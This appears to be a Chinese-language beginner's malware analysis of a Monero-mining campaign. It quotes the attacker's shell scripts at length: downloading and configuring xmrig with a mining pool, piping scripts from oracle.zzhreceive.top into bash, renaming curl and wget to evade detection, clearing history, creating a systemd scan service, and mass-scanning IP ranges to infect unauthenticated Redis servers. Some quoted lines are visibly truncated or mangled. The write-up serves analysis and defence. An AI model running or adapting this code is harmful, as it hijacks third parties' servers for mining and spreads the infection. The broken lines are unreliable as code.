    rm /tmp/xmrig.tar.gz
    if [ -f "$MOHOME/[ext4]" ]
     then
             echo "miner file exists, neednot backup"
     else
             curl -L --progress-bar $miner_url_backup -o  /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && chmod +x $MOHOME/\[ext4\]
    fi
    rm /tmp/cf.tar
    sed -i 's/"url": *"[^"]*",/"url": "xmr-asia1.nanopool.org:14444",/' $MOHOME/[ext4].pid
    sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/[ext4].pid
    sed -i 's/"coin": *[^"]*,/"coin": "monero",/' $MOHOME/[ext4].pid
    sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/' $MOHOME/[ext4].pid
    sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/[ext4].log'",#' $MOHOME/[ext4].pid
    sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/[ext4].pid
    cp $MOHOME/[ext4].pid $MOHOME/config_background.json
    sed -i 's/"background": *false,/"background": true,/' $MOHOME/config_background.json
#### 静默下载`cronis.sh`并运行
    echo ""
    echo "[*] Setup complete"
    curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/cronis.sh | bash || cd1 -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/cronis.sh | bash
    history -c
### 样本分析——cronis.sh
#### 命令替换绕检测
创建变量后期使用，修改命令绕过检测机制
    rtdir="/etc/svcupdates"
    bbdir="/usr/bin/curl"
    bbdira="/usr/bin/cd1"
    ccdir="/usr/bin/wget"
    ccdira="/usr/bin/wd1"
    mv /usr/bin/curl /usr/bin/url
    mv /usr/bin/url /usr/bin/cd1
    mv /usr/bin/wget /usr/bin/get
    mv /usr/bin/get /usr/bin/wd1
    sleep $( seq 3 7 | sort -R | head -n1 )
#### 安装扫描程序
安装pnscan，masscan扫描器，并下载后续脚本cronscan
    sleep 1
    echo "DER Uninstalled"
    if ! [ -x "$(command -v masscan)" ]; then
    rm -rf /var/lib/apt/lists/*
    rm -rf x1.tar.gz
    sleep 1
    $bbdira -sL -o x1.tar.gz http://oracle.zzhreceive.top/b2f628fff19fda999999999/1.0.4.tar.gz
    sleep 1
    [ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
    echo "Masscan Installed"
    fi
    echo "Masscan Already Installed"
    sleep 3 && rm -rf .watch
    if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
    $bbdira -sL -o .x112 http://oracle.zzhreceive.top/b2f628/p.tar || $ccdira -q -O .x112 http://oracle.zzhreceive.top/b2f628/p.tar 
    sleep 1
    [ -f .x112 ] && tar xf .x112&& cd pnscan && ./configure && make && make install && cd .. && rm -rf pnscan .x112
    echo "Pnscan Installed"
    fi
    echo "Pnscan Already Installed"
    $bbdir -fsSL http://oracle.zzhreceive.top/b2f628/cronscan | bash
    $bbdira -fsSL http://oracle.zzhreceive.top/b2f628/cronscan | bash
### 样本分析——cronscan
下载cronrs.sh，创建扫描服务，启动pnscan和masscan扫描器
    if ! type systemctl >/dev/null; then
        $aabb -fsSL http://oracle.zzhreceive.top/b2f628/cronrs.sh | bash
      else
        echo "[*] Creating scan systemd service"
    $aabb -fsSL http://oracle.zzhreceive.top/b2f628/cronrs.sh -o /var/tmp/.system/\[scan\] && chmod 744 /var/tmp/.system/\[scan\]
        cat >/tmp/scan.service /dev/null
        sudo systemctl daemon-reload
        sudo systemctl enable scan.service
        sudo systemctl start scan.service
    fi
### 样本分析——cronrs.sh
运行扫描器查找`192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16
116.128.0.0/16 116.163.0.0/16`ip段的redis未授权漏洞扩大攻击范围。
    pnx=pnscan
        [ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
        [ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
        for z in $( seq 0 5000 | sort -R ); do
        for x in $( echo -e "47\n39\n8\n121\n106\n120\n123\n65\n3\n101\n139\n99\n63\n81\n44\n18\n119\n100\n42\n49\n118\n54\n1\n50\n114\n182\n52\n13\n34\n112\n115\n111\n116\n16\n35\n117\n124\n59\n36\n103\n82\n175\n122\n129\n45\n152\n159\n113\n15\n61\n180\n172\n157\n60\n218\n176\n58\n204\n140\n184\n150\n193\n223\n192\n75\n46\n188\n183\n222\n14\n104\n27\n221\n211\n132\n107\n43\n212\n148\n110\n62\n202\n95\n220\n154\n23\n149\n125\n210\n203\n185\n171\n146\n109\n94\n219\n134" | sort -R ); do
        for y in $( seq 0 255 | sort -R ); do
        $pnx -t256 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
        awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
        while read -r h p; do
        cat .dat | redis-cli -h $h -p $p --raw &
        done /dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
        sleep 1
        while read -r h p; do
        cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
        done /dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
        sleep 1
        while read -r h p; do
        cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
        done /dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
        sleep 1
        masscan --max-rate 10000 -p6379 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
        sleep 1
        while read -r h p; do
        cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
        done /dev/null
萌新第一次写样本分析，如果有写的不好或者分析失误的地方望表哥们轻喷。
# Refer